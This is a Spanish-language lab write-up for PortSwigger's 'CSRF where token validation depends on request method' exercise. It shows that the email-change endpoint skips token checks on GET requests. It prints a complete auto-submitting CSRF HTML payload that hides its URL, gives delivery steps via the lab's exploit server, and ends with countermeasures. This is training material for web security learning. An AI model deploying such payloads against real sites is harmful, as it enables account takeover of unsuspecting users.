# Lab: CSRF where token validation depends on request method

**Plataforma:** PortSwigger Web Security Academy · **Dificultad:** Práctica · **Tipo:** CSRF

---

## Descripción del laboratorio

La funcionalidad de cambio de email es vulnerable a CSRF. Intenta bloquear ataques CSRF, pero solo aplica las defensas a ciertos tipos de petición.

Acceso con credenciales propias: `wiener:peter`

---

## Flujo del ataque

```
Login (wiener:peter) → Capturar petición POST con token CSRF
→ Probar cambio de método a GET → Confirmar que el token deja de validarse
→ Crear payload HTML con method="GET" → Desplegar en exploit server
→ Enviar a víctima → Email de víctima cambiado sin consentimiento
```

---

## 1. Acceso al laboratorio

```
URL: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
```

### Login

```
Usuario: wiener
Contraseña: peter
```

---

## 2. Análisis de la vulnerabilidad

### Captura de la petición de cambio de email

Al interceptar el cambio de correo desde "My account", la petición original es:

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

csrf=<token>&email=nuevo@correo.com
```

La petición POST sí incluye un token CSRF. Para que un ataque CSRF funcione contra la cuenta de otra persona, basta con conseguir que su navegador envíe esta petición usando su propia cookie de sesión — el problema es replicar el token, que en teoría debería impedirlo.

### La pregunta clave: ¿qué pasa si cambiamos el método a GET?

Se modifica la petición interceptada cambiando `POST` por `GET`, moviendo los parámetros a la URL:

```http
GET /my-account/change-email?email=test@test.com&csrf=<token> HTTP/2
```

La petición se procesa correctamente, sin necesidad de validar el token CSRF. El servidor solo verifica el token cuando el método es POST; cuando es GET, la protección desaparece por completo.

Esto significa que se puede armar un payload que envíe la petición como GET, sin necesidad de conocer ni filtrar el token de la víctima.

---

## 3. Crafting del payload CSRF

Como el método GET no exige token, el formulario malicioso solo necesita el parámetro `email`:

```html
<html>
  <body>
    <script>
      history.pushState("", "", "/")
    </script>
    <form method="GET" action="https://<lab-id>.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hacked@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

**Desglose:**

| Elemento | Función |
|----------|---------|
| `history.pushState(...)` | Limpia la URL visible tras el envío, para no levantar sospechas |
| `<form method="GET">` | Usa GET, el método que no valida el token CSRF |
| `<input type="hidden" name="email">` | Email malicioso que reemplazará al de la víctima |
| `document.forms[0].submit()` | Auto-envía el formulario al cargar la página |

La cookie de sesión de la víctima se adjunta automáticamente al ser una petición al mismo dominio del laboratorio.

---

## 4. Despliegue en exploit server

1. Acceder al exploit server del laboratorio.
2. Pegar el payload HTML en **Body**.
3. Click en **Store**.

Antes de enviar el exploit a la víctima, es importante cambiar el propio email de la cuenta, ya que el sistema no permite tener el mismo correo en dos cuentas distintas — si coincide, el ataque fallará contra la víctima.

---

## 5. Entrega a la víctima

1. Click en **Deliver exploit to victim**.
2. El laboratorio simula el acceso de la víctima al payload.
3. Su navegador ejecuta el script, el formulario se auto-envía como GET, y su sesión autenticada viaja junto con la petición.
4. El servidor procesa el cambio sin pedir token, porque la validación solo aplica a POST.

---

## 6. Validación

Laboratorio resuelto. El email de la víctima fue cambiado sin su consentimiento, confirmando el bypass de la protección CSRF.

---

## Por qué funciona

| Factor | Razón |
|--------|-------|
| Validación de token inconsistente | El servidor solo exige el token CSRF en peticiones POST |
| GET como método alternativo | El mismo endpoint acepta GET sin aplicar ninguna defensa |
| Cookie automática | El navegador de la víctima adjunta la sesión sin validarla |
| Parámetros en la URL | GET permite enviar `email` directamente como query string, sin necesidad de token |

---

## Contramedidas (no implementadas)

```php
// Validar el token CSRF independientemente del método HTTP
if (!validate_csrf_token($_REQUEST['csrf'])) { deny(); }

// Restringir el endpoint a un único método explícito
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { deny(); }

// SameSite Cookie
Set-Cookie: session=...; SameSite=Strict
```

---

## Referencias

- [PortSwigger — CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
